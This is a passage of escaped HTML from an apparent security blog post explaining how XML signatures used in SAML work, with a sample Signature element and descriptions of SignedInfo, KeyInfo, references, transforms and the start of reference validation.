sign the SAML request to protect against impersonation attacks.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This means that both the IdP and the SP have to parse and verify XML signatures passed to them by a potential malicious actor. Why is this a problem? Let's take a closer look at the way XML signatures work:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;XML Signatures&lt;/span&gt;&lt;/h2&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Most signature schemes operate on a raw byte stream and sign the data as seen on the wire. Instead, the XML signature standard (known as XMLDsig) tries to be robust against insignificant changes to the signed XML document. This means that changing whitespaces, line endings or comments in a signed document should not invalidate its signature.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;An XML signature consists of a special &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Signature&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element, an example of which is shown below:&lt;/span&gt;&lt;/p&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;Signature&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;SignedInfo&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;CanonicalizationMethod&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; Algorithm&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"http://www.w3.org/2001/10/xml-exc-c14n#\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;SignatureMethod&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; Algorithm&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\" &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;Reference&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; URI&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"#signed-data\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;Transforms&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;…&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/Transforms&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;DigestMethod&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; Algorithm&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"http://www.w3.org/2000/09/xmldsig#sha1\" &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;DigestValue&amp;gt;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;9bc34549d565d9505b287de0cd20ac77be1d3f2c&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/DigestValue&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/Reference&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/SignedInfo&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;SignatureValue&amp;gt;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;....&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/SignatureValue&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;KeyInfo&amp;gt;&amp;lt;X509Certificate&amp;gt;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;....&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/X509Certificate&amp;gt;&amp;lt;/KeyInfo&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/Signature&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;ul style=\"margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;\"&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The&amp;nbsp; &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; child contains&amp;nbsp; &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CanonicalizationMethod&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; and &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignatureMethod&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; elements as well as one or more &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; elements describing the integrity protected data.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KeyInfo&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; describes the signer key and can contain a raw public key, a X509 certificate or just a key id.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignatureValue&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; contains the cryptographic signature (using &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignatureMethod&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;) of the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element after it has been canonicalized using &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CanonicalizationMethod&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;At this point, only the integrity of the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element is protected. To understand how this protection is extended to the actual data, we need to take a look at the way &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; elements work: In theory the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; URI attribute can either point to an external document (&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;detached signature&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;), an element embedded as a child (&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;enveloping signature&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;) or any element in the outer document (&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;enveloped signature&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;). In practice, most SAML implementations use enveloped signatures and the Reference URI will point to the signed element somewhere in the current document tree.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;When a &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; is processed during verification or signing, the referenced content is passed through a chain of &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Transforms&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. XMLDsig supports a number of transforms ranging from canonicalization, over base64 decoding to XPath or even XSLT. Once all transforms have been processed the resulting byte stream is passed into the cryptographic hash function specified with the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;DigestMethod&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element and the result is stored in &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;DigestValue&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This way, as the whole &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element is part of &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, its integrity protection gets extended to the referenced element as well.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Validating a XML signature can therefore be split into two separate steps:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;\"&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference Validation: Iterate through all embedded references and for each reference fetch the referenced data, pump it through the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Transforms&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: 